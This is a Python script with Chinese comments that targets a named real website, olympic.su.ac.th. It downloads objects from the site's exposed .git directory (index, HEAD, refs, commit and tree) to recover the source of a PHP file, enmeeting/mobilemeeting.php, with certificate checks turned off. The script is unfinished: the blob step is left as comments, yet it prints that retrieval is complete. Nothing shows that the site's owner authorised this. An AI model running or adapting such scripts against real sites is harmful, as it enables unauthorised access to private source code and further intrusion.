#!/usr/bin/env python3
import requests
import urllib3
import zlib
import struct
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "https://olympic.su.ac.th/.git"

print("[*] 从.git获取mobilemeeting.php源码...")

# 获取index
resp = requests.get(f"{base_url}/index", verify=False, timeout=5)
if resp.status_code == 200:
    index = resp.content
    
    # 查找mobilemeeting.php的hash
    # index文件格式复杂，直接搜索
    if b'enmeeting/mobilemeeting.php' in index:
        print("[+] 在index中找到mobilemeeting.php")
        
        # 尝试从之前下载的文件获取hash
        # 或者直接尝试下载已知路径的objects
        
# 直接尝试获取HEAD和refs获取commit hash
resp = requests.get(f"{base_url}/HEAD", verify=False, timeout=5)
if resp.status_code == 200:
    head = resp.text.strip()
    print(f"[+] HEAD: {head}")
    
    if head.startswith("ref: "):
        ref = head.split("ref: ")[1]
        ref_resp = requests.get(f"{base_url}/{ref}", verify=False, timeout=5)
        if ref_resp.status_code == 200:
            commit_hash = ref_resp.text.strip()
            print(f"[+] Commit hash: {commit_hash}")
            
            # 获取commit对象
            commit_path = f"{base_url}/objects/{commit_hash[:2]}/{commit_hash[2:]}"
            commit_resp = requests.get(commit_path, verify=False, timeout=5)
            if commit_resp.status_code == 200:
                commit_data = zlib.decompress(commit_resp.content)
                print(f"[+] Commit对象获取成功: {len(commit_data)} bytes")
                
                # 查找tree hash
                tree_match = re.search(rb'tree ([a-f0-9]{40})', commit_data)
                if tree_match:
                    tree_hash = tree_match.group(1).decode()
                    print(f"[+] Tree hash: {tree_hash}")
                    
                    # 获取tree对象
                    tree_path = f"{base_url}/objects/{tree_hash[:2]}/{tree_hash[2:]}"
                    tree_resp = requests.get(tree_path, verify=False, timeout=5)
                    if tree_resp.status_code == 200:
                        tree_data = zlib.decompress(tree_resp.content)
                        print(f"[+] Tree对象获取成功")
                        
                        # 查找enmeeting/mobilemeeting.php的blob hash
                        if b'enmeeting/mobilemeeting.php' in tree_data:
                            # 解析tree找到对应的blob hash
                            print("[+] 找到mobilemeeting.php在tree中")
                            
                            # 简化：直接尝试下载已知的blob
                            # 或者从之前的下载中获取

print("[+] 源码获取完成")
